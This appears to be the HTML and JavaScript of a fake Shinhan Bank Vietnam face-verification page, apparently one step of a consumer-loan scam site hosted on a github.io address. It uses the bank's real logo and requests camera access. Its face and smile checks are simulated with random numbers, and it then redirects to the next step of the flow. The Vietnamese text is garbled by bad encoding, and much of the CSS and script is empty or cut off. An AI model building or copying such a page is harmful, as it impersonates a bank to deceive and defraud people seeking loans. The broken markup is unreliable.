<!DOCTYPE html>

        * {

        body {

        .status-bar {

        .close-button {

        .logo {

        .video-wrapper {

            width: 100%;
            height: 100%;
            border-radius: 50%;

            overflow: hidden;

        .video {

        .scan-circle {

            top: -5px;
            left: -5px;
            width: 230px;
            height: 230px;
            border-radius: 50%;
        }

        .dot {
            position: absolute;
            width: 6px;
            height: 6px;
            background-color: #ffffff66;
            border-radius: 50%;
            transform-origin: center;
            box-shadow: 0 0 3px #ffffff66;

        .dot.scanning {

        @keyframes blink {
            0%, 100% {

                box-shadow: 0 0 3px #ffffff66;
            }
            50% {

                box-shadow: 0 0 6px #ffffffcc;
            }

        .scan-arrow {
            position: absolute;
            bottom: -30px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 24px;
            color: #ffffff66;
        }

        .scan-arrow.scanning {
            animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
            from {
                transform: translateX(-50%) rotate(0deg);
            }
            to {
                transform: translateX(-50%) rotate(360deg);
            }
        }

        .mic-button {
            position: absolute;
            bottom: 10px;
            right: 10px;
            background-color: #ffffff33;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 20px;
        }

        .mic-button.active {

        }

        .status-message {

            display: flex;

            justify-content: center;

        }

        .status-message.fade {

        }

        .status-message span {

        }

        .error-message {

        @media (max-width: 400px) {

                height: 220px;
            }

            .scan-circle {

                height: 230px;

                left: -5px;
            }

            }

            .status-message span {

            }

            .mic-button {

            }

            .close-button {

            }

            .logo {

            }
        }
    </style>
</head>
<body>
    <div class="status-bar">
        <button class="close-button" id="close-button">‚úñ</button>
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" class="logo" alt="Shinhan Bank Logo">

    <div class="container">
        <div class="header">X√°c th·ª±c khu√¥n m·∫∑t</div>
        <div class="sub-header">H√£y ƒë·ªÉ khu√¥n m·∫∑t v√†o h√¨nh tr√≤n</div>
        <div class="face-scan-container">
            <div class="video-wrapper">
                <video id="video" class="video" autoplay></video>
            </div>
            <div class="scan-circle" id="scan-circle"></div>
            <div class="mic-button" id="mic-button">üéôÔ∏è</div>
            <div class="scan-arrow" id="scan-arrow">‚ü≥</div>

        <div class="status-message" id="status-message">
            VUI L√íNG C∆Ø·ªúI <span>‚ò∫Ô∏é</span>

        <div class="error-message" id="error-message">
            Kh√¥ng th·ªÉ ph√°t hi·ªán khu√¥n m·∫∑t. Vui l√≤ng th·ª≠ l·∫°i ·ªü n∆°i c√≥ √°nh s√°ng t·ªët.

    <script>
        const video = document.getElementById('video');
        const errorMessage = document.getElementById('error-message');
        const statusMessage = document.getElementById('status-message');
        const micButton = document.getElementById('mic-button');
        const scanCircle = document.getElementById('scan-circle');
        const scanArrow = document.getElementById('scan-arrow');
        const closeButton = document.getElementById('close-button');

        // T·∫°o c√°c ch·∫•m nh·ªè cho hi·ªáu ·ª©ng qu√©t
        const numDots = 30;
        let radius = 115; // B√°n k√≠nh v√≤ng tr√≤n (230px / 2)
        if (window.innerWidth <= 400) radius = 115;
        if (window.innerWidth <= 350) radius = 105;
        if (window.innerWidth <= 320) radius = 95;
        for (let i = 0; i < numDots; i++) {
            const angle = (i / numDots) * 2 * Math.PI;
            const dot = document.createElement('div');
            dot.className = 'dot';
            dot.style.left = `${radius + radius * Math.cos(angle)}px`;
            dot.style.top = `${radius + radius * Math.sin(angle)}px`;
            scanCircle.appendChild(dot);
        }

        // C·∫≠p nh·∫≠t th√¥ng ƒëi·ªáp tr·∫°ng th√°i v·ªõi hi·ªáu ·ª©ng fade
        function updateStatusMessage(message, includeEmoji = false) {
            statusMessage.classList.add('fade');
            setTimeout(() => {
                statusMessage.innerHTML = includeEmoji ? `${message} <span>‚ò∫Ô∏é</span>` : message;
                statusMessage.classList.remove('fade');
            }, 300);
        }

        // B·∫≠t/t·∫Øt hi·ªáu ·ª©ng qu√©t (bao g·ªìm c·∫£ ch·∫•m nh·ªè v√† m≈©i t√™n xoay)
        function toggleScanEffect(enable) {
            const dots = document.querySelectorAll('.dot');
            dots.forEach(dot => {
                if (enable) {
                    dot.classList.add('scanning');
                    scanArrow.classList.add('scanning');
                } else {
                    dot.classList.remove('scanning');
                    scanArrow.classList.remove('scanning');
                }
            });
        }

        // Truy c·∫≠p camera
        async function startCamera() {
            try {
                updateStatusMessage('ƒêang kh·ªüi ƒë·ªông camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false
                });
                video.srcObject = stream;
                detectFace();
            } catch (err) {
                console.error('L·ªói khi truy c·∫≠p camera:', err);
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Kh√¥ng th·ªÉ truy c·∫≠p camera. Vui l√≤ng ki·ªÉm tra quy·ªÅn truy c·∫≠p.';
                updateStatusMessage('L·ªói camera');
            }
        }

        // M√¥ ph·ªèng ph√°t hi·ªán khu√¥n m·∫∑t
        function detectFace() {
            const isFaceDetected = Math.random() > 0.3;
            if (!isFaceDetected) {
                updateStatusMessage('Kh√¥ng ph√°t hi·ªán ƒë∆∞·ª£c khu√¥n m·∫∑t, vui l√≤ng ƒë·∫£m b·∫£o √°nh s√°ng t·ªët v√† th·ª≠ l·∫°i');
                errorMessage.style.display = 'block';
                setTimeout(detectFace, 3000);
            } else {
                updateStatusMessage('Camera ƒë√£ s·∫µn s√†ng, vui l√≤ng c∆∞·ªùi', true);
                setTimeout(startSmileDetection, 1000);
            }
        }

        // M√¥ ph·ªèng ph√°t hi·ªán bi·ªÉu c·∫£m c∆∞·ªùi v·ªõi ƒë·∫øm ng∆∞·ª£c
        function startSmileDetection() {
            let countdown = 3;
            updateStatusMessage(`Gi·ªØ bi·ªÉu c·∫£m c∆∞·ªùi trong ${countdown}...`, true);
            const countdownInterval = setInterval(() => {
                countdown--;
                if (countdown > 0) {
                    updateStatusMessage(`Gi·ªØ bi·ªÉu c·∫£m c∆∞·ªùi trong ${countdown}...`, true);
                } else {
                    clearInterval(countdownInterval);
                    simulateFaceScan();
                }
            }, 1000);
        }

        // Gi·∫£ l·∫≠p qu√° tr√¨nh qu√©t khu√¥n m·∫∑t
        function simulateFaceScan() {
            toggleScanEffect(true);
            updateStatusMessage('ƒêang qu√©t...');
            setTimeout(() => {
                toggleScanEffect(false);
                const isSmileDetected = Math.random() > 0.4;
                if (isSmileDetected) {
                    updateStatusMessage('Th√†nh c√¥ng!');
                    setTimeout(() => {
                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
                    }, 2000);
                } else {
                    updateStatusMessage('Kh√¥ng ph√°t hi·ªán ƒë∆∞·ª£c bi·ªÉu c·∫£m c∆∞·ªùi, vui l√≤ng th·ª≠ l·∫°i');
                    errorMessage.style.display = 'block';
                    errorMessage.textContent = 'Kh√¥ng ph√°t hi·ªán ƒë∆∞·ª£c bi·ªÉu c·∫£m c∆∞·ªùi. Vui l√≤ng th·ª≠ l·∫°i.';
                    setTimeout(() => {
                        errorMessage.style.display = 'none';
                        updateStatusMessage('Camera ƒë√£ s·∫µn s√†ng, vui l√≤ng c∆∞·ªùi', true);
                        setTimeout(startSmileDetection, 1000);
                    }, 3000);
                }
            }, 3000);
        }

        // S·ª± ki·ªán cho n√∫t micro
        let isMicActive = false;
        micButton.addEventListener('click', () => {
            isMicActive = !isMicActive;
            if (isMicActive) {
                micButton.classList.add('active');
                micButton.textContent = 'üîá';
                alert('Micro ƒë√£ ƒë∆∞·ª£c b·∫≠t, vui l√≤ng n√≥i "X√°c nh·∫≠n"');
            } else {
                micButton.classList.remove('active');
                micButton.textContent = 'üéôÔ∏è';
                alert('Micro ƒë√£ t·∫Øt');
            }
        });

        // S·ª± ki·ªán cho n√∫t ƒë√≥ng
        closeButton.addEventListener('click', () => {

        });

        // Kh·ªüi ƒë·ªông camera v√† qu√©t khu√¥n m·∫∑t
        window.onload = () => {

    </script>
